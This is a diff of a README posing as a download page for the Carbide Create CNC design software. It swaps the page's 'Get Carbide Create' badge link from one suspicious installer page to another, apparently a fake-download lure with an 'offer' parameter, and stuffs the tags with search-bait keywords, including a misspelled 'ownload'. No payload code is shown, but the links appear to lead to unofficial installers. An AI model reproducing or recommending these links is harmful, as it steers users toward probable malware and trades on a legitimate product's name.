@@ -1,6 +1,6 @@
 # Carbide Create Download — Desktop CNC Design  
 
-[![Get Carbide Create GitHub](https://img.shields.io/badge/Get%20Carbide%20Create%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/bravespirit679/da8e5076d47f0b399330ebff2eb6a2b9/raw/7ebc9eae2471670973a9c8b160723157b4cb72f9/install.html?offer=CarbideCreate)  
+[![Get Carbide Create GitHub](https://img.shields.io/badge/Get%20Carbide%20Create%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CarbideCreate)  
 
 ---
 
@@ -63,7 +63,7 @@ A: Absolutely, the interface is user-friendly and ideal for learning CNC design 
 ---
 
 ## 🔍 Tags  
-Carbide Create, CNC design, CAD CAM, 2D modeling, toolpath generation, woodworking, milling, G-code, Mac CNC, Windows CNC, desktop design software, Carbide Create pc, Carbide Create windows, Carbide Create desktop, Carbide Create for mac, Carbide Create for pc, Carbide Create for windows, Carbide Create mac  
+Carbide Create, download carbide create, ownload carbide create, carbide create download, carbide create pro, CNC design, CAD CAM, 2D modeling, toolpath generation, woodworking, milling, G-code, Mac CNC, Windows CNC, desktop design software, Carbide Create pc, Carbide Create windows, Carbide Create desktop, Carbide Create for mac, Carbide Create for pc, Carbide Create for windows, Carbide Create mac  
 
 ---
 
